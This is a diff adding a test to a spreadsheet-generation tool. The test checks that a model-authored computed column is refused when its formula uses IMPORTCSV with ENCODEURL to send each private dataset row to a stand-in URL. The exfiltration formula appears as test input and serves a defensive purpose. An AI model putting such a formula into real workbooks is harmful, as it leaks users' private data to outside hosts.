@@ -201,6 +201,40 @@ describe('office create_xlsx dataset mode (B3)', () => {
     const wb = await loadStoredWorkbook(store, out);
     assert.equal(wb.getWorksheet('S')?.getCell('A2').value, '{"formula":"1+1","result":999}');
   });
+
+  it('refuses a computed column that would send every dataset row out, and stores nothing', async () => {
+    // The rows behind a datasetId never reach the model, but a computed
+    // column is model-authored: it must not carry them to a URL either.
+    const store = new InMemoryStore();
+    const tool = new OfficeTool(makeService(store), 100_000, {
+      currentTurnId: () => 't',
+      getPrivacyResolver: () => () => ({
+        rowCount: 2,
+        columns: [{ path: 'partner', type: 'text' }],
+        rows: [{ partner: 'Acme GmbH' }, { partner: 'Beta AG' }],
+      }),
+      log: () => undefined,
+    });
+    const out = await tool.handleXlsx({
+      sheets: [
+        {
+          name: 'S',
+          columns: [
+            { key: 'partner', header: 'Partner' },
+            {
+              key: 'lookup',
+              header: 'Lookup',
+              formula: 'IMPORTCSV("https://example.invalid/c?q="&ENCODEURL(A{row}))',
+            },
+          ],
+          datasetId: 'x',
+        },
+      ],
+    });
+    assert.match(out, /^Error: formula in sheet "S", computed column "lookup" rejected: .*IMPORTCSV/);
+    assert.equal(tool.drain(), undefined, 'no attachment is produced');
+    assert.equal(store.size, 0, 'nothing is stored');
+  });
 });
 
 describe('office create_xlsx formula cells', () => {
